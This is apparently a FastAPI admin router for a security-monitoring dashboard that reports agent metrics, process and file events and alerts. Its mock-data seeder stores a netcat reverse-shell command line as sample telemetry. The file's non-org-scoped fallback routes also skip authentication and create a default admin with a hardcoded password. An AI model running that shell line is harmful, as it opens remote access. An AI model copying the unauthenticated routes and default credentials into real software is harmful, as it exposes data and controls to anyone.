from datetime import datetime, timedelta
import random
from typing import Dict, List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, status
from sqlalchemy import func, or_, desc
from sqlalchemy.orm import Session

from backend.db.models import (
    AgentModel,
    AlertModel,
    FSEventModel,
    MetricsSnapshotModel,
    OrganizationModel,
    ProcessEventModel,
    UserModel,
    UserOrganizationModel,
)
from backend.db.session import get_db
from backend.logging_config import logger
from backend.user_auth import get_current_user, require_org_membership

router = APIRouter(prefix="/api/admin", tags=["admin"])


def compute_threat_level(alerts: List[AlertModel]) -> str:
    """Compute overall threat badge level ('none', 'warning', 'critical') for an agent based on active alerts."""
    unack_alerts = [a for a in alerts if not a.acknowledged]
    if any(a.severity.lower() == "critical" for a in unack_alerts):
        return "critical"
    elif any(a.severity.lower() in ("warning", "high") for a in unack_alerts):
        return "warning"
    elif unack_alerts:
        return "info"
    return "none"


# ---------------------------------------------------------------------------
# All routes below are org-scoped and require JWT + org membership
# ---------------------------------------------------------------------------


@router.get("/orgs/{org_id}/systems")
def list_systems(
    org_id: str,
    search: Optional[str] = None,
    os_filter: Optional[str] = Query(None, alias="os"),
    status_filter: Optional[str] = Query(None, alias="status"),
    threat_filter: Optional[str] = Query(None, alias="threat_level"),
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Org-scoped fleet list with live computed status and threat badges."""
    require_org_membership(user, org_id, db)

    query = db.query(AgentModel).filter(AgentModel.org_id == org_id)

    if search:
        s = f"%{search.strip()}%"
        query = query.filter(or_(AgentModel.hostname.ilike(s), AgentModel.ip.ilike(s), AgentModel.id.ilike(s)))

    if os_filter:
        query = query.filter(AgentModel.os.ilike(f"%{os_filter}%"))

    agents = query.order_by(AgentModel.last_seen_at.desc()).all()
    results = []
    agent_ids = [a.id for a in agents]

    # Pre-fetch all alerts for these agents in a single query (batching to solve N+1)
    all_alerts = db.query(AlertModel).filter(AlertModel.agent_id.in_(agent_ids)).all() if agent_ids else []
    alerts_by_agent: Dict[str, List[AlertModel]] = {}
    for a in all_alerts:
        alerts_by_agent.setdefault(a.agent_id, []).append(a)

    # Pre-fetch recent metrics snapshots for these agents
    all_metrics = (
        db.query(MetricsSnapshotModel)
        .filter(MetricsSnapshotModel.agent_id.in_(agent_ids))
        .order_by(MetricsSnapshotModel.timestamp.desc())
        .all()
    ) if agent_ids else []
    metrics_by_agent: Dict[str, List[MetricsSnapshotModel]] = {}
    for m in all_metrics:
        m_list = metrics_by_agent.setdefault(m.agent_id, [])
        if len(m_list) < 10:
            m_list.append(m)

    for agent in agents:
        computed_status = agent.get_status(threshold_seconds=90)

        if status_filter and computed_status.lower() != status_filter.lower():
            continue

        agent_alerts = alerts_by_agent.get(agent.id, [])
        threat_level = compute_threat_level(agent_alerts)

        if threat_filter and threat_level.lower() != threat_filter.lower():
            continue

        recent_metrics = list(metrics_by_agent.get(agent.id, []))
        recent_metrics.reverse()

        latest_metric = recent_metrics[-1] if recent_metrics else None

        results.append({
            "id": agent.id,
            "hostname": agent.hostname,
            "os": agent.os,
            "ip": agent.ip,
            "agent_version": agent.agent_version,
            "enrolled_at": agent.enrolled_at,
            "last_seen_at": agent.last_seen_at,
            "status": computed_status,
            "threat_level": threat_level,
            "active_alert_count": len([a for a in agent_alerts if not a.acknowledged]),
            "latest_metrics": {
                "cpu_percent": latest_metric.cpu_percent if latest_metric else 0.0,
                "mem_percent": latest_metric.mem_percent if latest_metric else 0.0,
                "disk_percent": latest_metric.disk_percent if latest_metric else 0.0,
                "process_count": latest_metric.process_count if latest_metric else 0,
            },
            "sparklines": {
                "cpu": [m.cpu_percent for m in recent_metrics],
                "mem": [m.mem_percent for m in recent_metrics],
            },
        })

    return results


@router.get("/orgs/{org_id}/systems/{agent_id}")
def get_system_detail(
    org_id: str,
    agent_id: str,
    time_range_hours: int = 24,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Org-scoped single system detail view."""
    require_org_membership(user, org_id, db)

    agent = db.query(AgentModel).filter(AgentModel.id == agent_id, AgentModel.org_id == org_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail=f"Agent system '{agent_id}' not found in this organization.")

    cutoff = datetime.utcnow() - timedelta(hours=time_range_hours)

    metrics = (
        db.query(MetricsSnapshotModel)
        .filter(MetricsSnapshotModel.agent_id == agent_id, MetricsSnapshotModel.timestamp >= cutoff)
        .order_by(MetricsSnapshotModel.timestamp.asc())
        .all()
    )

    alerts = (
        db.query(AlertModel)
        .filter(AlertModel.agent_id == agent_id)
        .order_by(AlertModel.timestamp.desc())
        .all()
    )

    latest_processes = (
        db.query(ProcessEventModel)
        .filter(ProcessEventModel.agent_id == agent_id)
        .order_by(ProcessEventModel.timestamp.desc())
        .limit(30)
        .all()
    )

    recent_fs = (
        db.query(FSEventModel)
        .filter(FSEventModel.agent_id == agent_id)
        .order_by(FSEventModel.timestamp.desc())
        .limit(30)
        .all()
    )

    return {
        "header": {
            "id": agent.id,
            "hostname": agent.hostname,
            "os": agent.os,
            "ip": agent.ip,
            "agent_version": agent.agent_version,
            "enrolled_at": agent.enrolled_at,
            "last_seen_at": agent.last_seen_at,
            "status": agent.get_status(threshold_seconds=90),
            "threat_level": compute_threat_level(alerts),
        },
        "metrics_series": [
            {
                "timestamp": m.timestamp,
                "cpu_percent": m.cpu_percent,
                "mem_percent": m.mem_percent,
                "disk_percent": m.disk_percent,
                "net_sent_mb": round(m.net_bytes_sent / (1024 * 1024), 2),
                "net_recv_mb": round(m.net_bytes_recv / (1024 * 1024), 2),
                "process_count": m.process_count,
            }
            for m in metrics
        ],
        "alerts": [
            {
                "id": a.id,
                "timestamp": a.timestamp,
                "severity": a.severity,
                "rule_id": a.rule_id,
                "message": a.message,
                "acknowledged": a.acknowledged,
            }
            for a in alerts
        ],
        "latest_processes": [
            {
                "id": p.id,
                "timestamp": p.timestamp,
                "event_type": p.event_type,
                "pid": p.pid,
                "name": p.name,
                "exe_path": p.exe_path,
                "cmdline": p.cmdline,
                "user": p.user,
                "cpu_percent": p.cpu_percent,
                "mem_rss_mb": round(p.mem_rss / (1024 * 1024), 2),
            }
            for p in latest_processes
        ],
        "recent_fs_events": [
            {
                "id": f.id,
                "timestamp": f.timestamp,
                "event_type": f.event_type,
                "src_path": f.src_path,
                "dest_path": f.dest_path,
                "is_directory": f.is_directory,
            }
            for f in recent_fs
        ],
    }


@router.get("/orgs/{org_id}/systems/{agent_id}/timeline")
def get_unified_event_timeline(
    org_id: str,
    agent_id: str,
    event_category: Optional[str] = Query("all", description="all, process, fs"),
    search: Optional[str] = None,
    page: int = 1,
    page_size: int = 20,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Org-scoped paginated unified searchable event timeline."""
    require_org_membership(user, org_id, db)

    # Verify agent belongs to org
    agent = db.query(AgentModel).filter(AgentModel.id == agent_id, AgentModel.org_id == org_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found in this organization.")

    events = []

    if event_category in ("all", "process"):
        proc_q = db.query(ProcessEventModel).filter(ProcessEventModel.agent_id == agent_id)
        if search:
            s = f"%{search.strip()}%"
            proc_q = proc_q.filter(or_(ProcessEventModel.name.ilike(s), ProcessEventModel.exe_path.ilike(s), ProcessEventModel.cmdline.ilike(s)))
        for p in proc_q.all():
            events.append({
                "id": f"proc_{p.id}",
                "timestamp": p.timestamp,
                "category": "process",
                "event_type": p.event_type,
                "title": f"Process {p.event_type.upper()}: {p.name} (PID {p.pid})",
                "details": f"User: {p.user or 'N/A'} | Exe: {p.exe_path or 'N/A'} | Cmd: {p.cmdline or 'N/A'}",
                "cpu_percent": p.cpu_percent,
            })

    if event_category in ("all", "fs"):
        fs_q = db.query(FSEventModel).filter(FSEventModel.agent_id == agent_id)
        if search:
            s = f"%{search.strip()}%"
            fs_q = fs_q.filter(or_(FSEventModel.src_path.ilike(s), FSEventModel.dest_path.ilike(s)))
        for f in fs_q.all():
            events.append({
                "id": f"fs_{f.id}",
                "timestamp": f.timestamp,
                "category": "filesystem",
                "event_type": f.event_type,
                "title": f"FS {f.event_type.upper()}: {f.src_path}",
                "details": f"Dest: {f.dest_path or 'N/A'} | Directory: {f.is_directory}",
            })

    events.sort(key=lambda x: x["timestamp"], reverse=True)

    total_count = len(events)
    start_idx = (page - 1) * page_size
    end_idx = start_idx + page_size
    paginated_events = events[start_idx:end_idx]

    return {
        "total": total_count,
        "page": page,
        "page_size": page_size,
        "total_pages": (total_count + page_size - 1) // page_size if total_count > 0 else 1,
        "items": paginated_events,
    }


@router.get("/orgs/{org_id}/dashboard/stats")
def get_fleet_stats(
    org_id: str,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Org-scoped fleet-wide aggregate statistics."""
    require_org_membership(user, org_id, db)

    agents = db.query(AgentModel).filter(AgentModel.org_id == org_id).all()
    agent_ids = [a.id for a in agents]
    total_agents = len(agents)
    online_count = sum(1 for a in agents if a.get_status() == "online")
    offline_count = total_agents - online_count

    alerts = db.query(AlertModel).filter(AlertModel.agent_id.in_(agent_ids)).all() if agent_ids else []
    unack_alerts = [a for a in alerts if not a.acknowledged]

    crit_count = sum(1 for a in unack_alerts if a.severity.lower() == "critical")
    warn_count = sum(1 for a in unack_alerts if a.severity.lower() == "warning")
    info_count = sum(1 for a in unack_alerts if a.severity.lower() == "info")

    recent_metrics = (
        db.query(MetricsSnapshotModel)
        .filter(MetricsSnapshotModel.agent_id.in_(agent_ids))
        .order_by(MetricsSnapshotModel.timestamp.desc())
        .limit(100)
        .all()
    ) if agent_ids else []
    avg_cpu = sum(m.cpu_percent for m in recent_metrics) / len(recent_metrics) if recent_metrics else 0.0
    avg_mem = sum(m.mem_percent for m in recent_metrics) / len(recent_metrics) if recent_metrics else 0.0

    return {
        "summary": {
            "total_systems": total_agents,
            "online_systems": online_count,
            "offline_systems": offline_count,
            "unacknowledged_alerts": len(unack_alerts),
            "critical_alerts": crit_count,
            "warning_alerts": warn_count,
            "info_alerts": info_count,
            "avg_fleet_cpu": round(avg_cpu, 1),
            "avg_fleet_mem": round(avg_mem, 1),
        },
        "alert_counts_by_severity": {
            "critical": crit_count,
            "warning": warn_count,
            "info": info_count,
        },
    }


@router.get("/orgs/{org_id}/threats")
def list_active_threats(
    org_id: str,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Org-scoped active unacknowledged threat alerts."""
    require_org_membership(user, org_id, db)

    agent_ids = [a.id for a in db.query(AgentModel).filter(AgentModel.org_id == org_id).all()]

    alerts = (
        db.query(AlertModel)
        .filter(AlertModel.acknowledged == False, AlertModel.agent_id.in_(agent_ids))
        .order_by(AlertModel.timestamp.desc())
        .all()
    ) if agent_ids else []

    results = []
    for a in alerts:
        agent = db.query(AgentModel).filter(AgentModel.id == a.agent_id).first() if a.agent_id else None
        results.append({
            "id": a.id,
            "agent_id": a.agent_id,
            "hostname": agent.hostname if agent else "Unknown Host",
            "ip": agent.ip if agent else "N/A",
            "timestamp": a.timestamp,
            "severity": a.severity,
            "rule_id": a.rule_id or "SECURITY_RULE",
            "message": a.message,
            "acknowledged": a.acknowledged,
        })

    severity_order = {"critical": 0, "warning": 1, "info": 2}
    results.sort(key=lambda x: severity_order.get(x["severity"].lower(), 3))

    return results


@router.post("/orgs/{org_id}/threats/{alert_id}/acknowledge")
def acknowledge_threat(
    org_id: str,
    alert_id: int,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Acknowledge/dismiss an active threat alert within the org."""
    require_org_membership(user, org_id, db)

    alert = db.query(AlertModel).filter(AlertModel.id == alert_id).first()
    if not alert:
        raise HTTPException(status_code=404, detail=f"Alert '{alert_id}' not found.")

    # Verify alert's agent belongs to this org
    if alert.agent_id:
        agent = db.query(AgentModel).filter(AgentModel.id == alert.agent_id, AgentModel.org_id == org_id).first()
        if not agent:
            raise HTTPException(status_code=403, detail="Alert does not belong to this organization.")

    alert.acknowledged = True
    alert.status = "ACKNOWLEDGED"
    db.commit()
    return {"status": "success", "message": f"Alert {alert_id} acknowledged."}


@router.post("/orgs/{org_id}/seed-mock-data")
def seed_mock_data(
    org_id: str,
    user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Seeds synthetic telemetry data scoped to the given org. Dev only."""
    import os
    if os.getenv("APP_ENV", "development").lower() == "production":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Mock telemetry seeding is disabled in production environments.",
        )

    require_org_membership(user, org_id, db)

    now = datetime.utcnow()

    # Clear existing data for this org's agents only
    org_agents = db.query(AgentModel).filter(AgentModel.org_id == org_id).all()
    org_agent_ids = [a.id for a in org_agents]
    if org_agent_ids:
        db.query(AlertModel).filter(AlertModel.agent_id.in_(org_agent_ids)).delete(synchronize_session=False)
        db.query(FSEventModel).filter(FSEventModel.agent_id.in_(org_agent_ids)).delete(synchronize_session=False)
        db.query(ProcessEventModel).filter(ProcessEventModel.agent_id.in_(org_agent_ids)).delete(synchronize_session=False)
        db.query(MetricsSnapshotModel).filter(MetricsSnapshotModel.agent_id.in_(org_agent_ids)).delete(synchronize_session=False)
        db.query(AgentModel).filter(AgentModel.org_id == org_id).delete(synchronize_session=False)
    db.commit()

    mock_hosts = [
        {"id": f"agent_{org_id[:8]}_web01", "hostname": "prod-web-front01", "os": "Ubuntu 22.04 LTS", "ip": "10.0.1.15", "ver": "1.2.4", "offline": False},
        {"id": f"agent_{org_id[:8]}_db02", "hostname": "prod-db-primary", "os": "Debian 12 Bookworm", "ip": "10.0.1.20", "ver": "1.2.4", "offline": False},
        {"id": f"agent_{org_id[:8]}_soc03", "hostname": "soc-analyst-laptop", "os": "macOS Sonoma 14.4", "ip": "192.168.1.102", "ver": "1.2.3", "offline": False},
        {"id": f"agent_{org_id[:8]}_fin04", "hostname": "fin-ledger-pc", "os": "Windows 11 Enterprise", "ip": "192.168.2.44", "ver": "1.2.4", "offline": False},
        {"id": f"agent_{org_id[:8]}_leg05", "hostname": "legacy-app-server", "os": "CentOS 7.9", "ip": "10.0.3.99", "ver": "1.1.0", "offline": True},
    ]

    for host in mock_hosts:
        last_seen = now - timedelta(minutes=15) if host["offline"] else now - timedelta(seconds=15)
        agent = AgentModel(
            id=host["id"],
            org_id=org_id,
            hostname=host["hostname"],
            os=host["os"],
            ip=host["ip"],
            agent_version=host["ver"],
            auth_token_hash=f"hash_{host['id']}",
            enrolled_at=now - timedelta(days=7),
            last_seen_at=last_seen,
        )
        db.add(agent)

        for i in range(12):
            ts = now - timedelta(minutes=(12 - i) * 10)
            cpu = random.uniform(15.0, 45.0) if not host["hostname"].startswith("fin") else random.uniform(88.0, 98.0)
            mem = random.uniform(40.0, 75.0)
            snap = MetricsSnapshotModel(
                agent_id=host["id"],
                timestamp=ts,
                cpu_percent=cpu,
                mem_percent=mem,
                disk_percent=random.uniform(50.0, 80.0),
                net_bytes_sent=random.randint(500000, 5000000),
                net_bytes_recv=random.randint(1000000, 10000000),
                process_count=random.randint(110, 180),
            )
            db.add(snap)

        procs = [
            ("nginx", "/usr/sbin/nginx", "root"),
            ("python3", "/usr/bin/python3 /app/backend/main.py", "appuser"),
            ("postgres", "/usr/lib/postgresql/16/bin/postgres", "postgres"),
            ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "SYSTEM"),
        ]
        if host["hostname"].startswith("fin"):
            procs.append(("nc.exe", "/tmp/nc.exe -e /bin/bash 192.168.1.50 4444", "root"))

        for name, cmd, usr in procs:
            pe = ProcessEventModel(
                agent_id=host["id"],
                timestamp=now - timedelta(minutes=random.randint(1, 60)),
                event_type="start" if "nc" in name else "snapshot",
                pid=random.randint(1000, 9999),
                name=name,
                exe_path=cmd.split()[0],
                cmdline=cmd,
                user=usr,
                cpu_percent=random.uniform(0.1, 15.0),
                mem_rss=random.randint(10485760, 209715200),
            )
            db.add(pe)

        for k in range(5):
            fe = FSEventModel(
                agent_id=host["id"],
                timestamp=now - timedelta(minutes=random.randint(1, 30)),
                event_type=random.choice(["created", "modified", "deleted"]),
                src_path=f"/var/log/syslog.{k}" if "Ubuntu" in host["os"] else f"C:\\Users\\Finance\\Docs\\payroll_{k}.xlsx",
                is_directory=False,
            )
            db.add(fe)

    db.commit()

    # Seed alerts for fin-ledger-pc & legacy server
    fin_id = f"agent_{org_id[:8]}_fin04"
    leg_id = f"agent_{org_id[:8]}_leg05"

    al1 = AlertModel(
        agent_id=fin_id,
        device_id=fin_id,
        user_id="fin-ledger-pc",
        timestamp=now - timedelta(minutes=5),
        severity="critical",
        rule_id="PROC_SUSPICIOUS_PATH",
        message="Process 'nc.exe' executed from suspicious temporary path /tmp/nc.exe with root privileges.",
        acknowledged=False,
        status="ACTIVE",
    )
    al2 = AlertModel(
        agent_id=fin_id,
        device_id=fin_id,
        user_id="fin-ledger-pc",
        timestamp=now - timedelta(minutes=3),
        severity="warning",
        rule_id="RESOURCE_SUSTAINED_SPIKE",
        message="Sustained high CPU spike detected on fin-ledger-pc: 96.4% utilization.",
        acknowledged=False,
        status="ACTIVE",
    )
    al3 = AlertModel(
        agent_id=leg_id,
        device_id=leg_id,
        user_id="legacy-app-server",
        timestamp=now - timedelta(minutes=15),
        severity="warning",
        rule_id="AGENT_OFFLINE_UNEXPECTED",
        message="Agent legacy-app-server stopped reporting telemetry unexpectedly (last seen 15 mins ago).",
        acknowledged=False,
        status="ACTIVE",
    )
    db.add_all([al1, al2, al3])
    db.commit()

    return {"status": "success", "message": f"Mock telemetry data seeded for org {org_id} with 5 agent systems."}


def get_default_user_and_org(db: Session):
    # Find any organization
    org = db.query(OrganizationModel).first()
    if org:
        user = db.query(UserModel).filter(UserModel.id == org.owner_user_id).first()
        if user:
            return user, org.id

    # If none exists, create default admin user
    user = db.query(UserModel).filter(UserModel.username == "default_admin").first()
    if not user:
        from backend.user_auth import hash_password
        user = UserModel(
            email="admin@cipherwatch.local",
            username="default_admin",
            password_hash=hash_password("defaultpassword123"),
        )
        db.add(user)
        db.flush()

    # Create default org
    org = OrganizationModel(
        name="Default Organization",
        owner_user_id=user.id,
    )
    db.add(org)
    db.flush()

    # Create membership
    membership = UserOrganizationModel(
        user_id=user.id,
        org_id=org.id,
        role="owner",
    )
    db.add(membership)
    db.commit()
    db.refresh(org)
    return user, org.id


# ---------------------------------------------------------------------------
# Non-org-scoped endpoints (for fallback / demo / local dashboard)
# ---------------------------------------------------------------------------

@router.get("/dashboard/stats")
def get_fleet_stats_default(db: Session = Depends(get_db)):
    user, org_id = get_default_user_and_org(db)
    return get_fleet_stats(org_id=org_id, user=user, db=db)


@router.get("/systems")
def list_systems_default(
    search: Optional[str] = None,
    os_filter: Optional[str] = Query(None, alias="os"),
    status_filter: Optional[str] = Query(None, alias="status"),
    threat_filter: Optional[str] = Query(None, alias="threat_level"),
    db: Session = Depends(get_db),
):
    user, org_id = get_default_user_and_org(db)
    return list_systems(
        org_id=org_id,
        search=search,
        os_filter=os_filter,
        status_filter=status_filter,
        threat_filter=threat_filter,
        user=user,
        db=db,
    )


@router.get("/threats")
def list_active_threats_default(db: Session = Depends(get_db)):
    user, org_id = get_default_user_and_org(db)
    return list_active_threats(org_id=org_id, user=user, db=db)


@router.post("/seed-mock-data")
def seed_mock_data_default(db: Session = Depends(get_db)):
    user, org_id = get_default_user_and_org(db)
    return seed_mock_data(org_id=org_id, user=user, db=db)


@router.get("/systems/{agent_id}")
def get_system_detail_default(
    agent_id: str,
    time_range_hours: int = 24,
    db: Session = Depends(get_db),
):
    user, org_id = get_default_user_and_org(db)
    return get_system_detail(
        org_id=org_id,
        agent_id=agent_id,
        time_range_hours=time_range_hours,
        user=user,
        db=db,
    )


@router.get("/systems/{agent_id}/timeline")
def get_unified_event_timeline_default(
    agent_id: str,
    event_category: Optional[str] = Query("all", description="all, process, fs"),
    search: Optional[str] = None,
    page: int = 1,
    page_size: int = 20,
    db: Session = Depends(get_db),
):
    user, org_id = get_default_user_and_org(db)
    return get_unified_event_timeline(
        org_id=org_id,
        agent_id=agent_id,
        event_category=event_category,
        search=search,
        page=page,
        page_size=page_size,
        user=user,
        db=db,
    )


@router.post("/threats/{alert_id}/acknowledge")
def acknowledge_threat_default(
    alert_id: int,
    db: Session = Depends(get_db),
):
    user, org_id = get_default_user_and_org(db)
    return acknowledge_threat(
        org_id=org_id,
        alert_id=alert_id,
        user=user,
        db=db,
    )
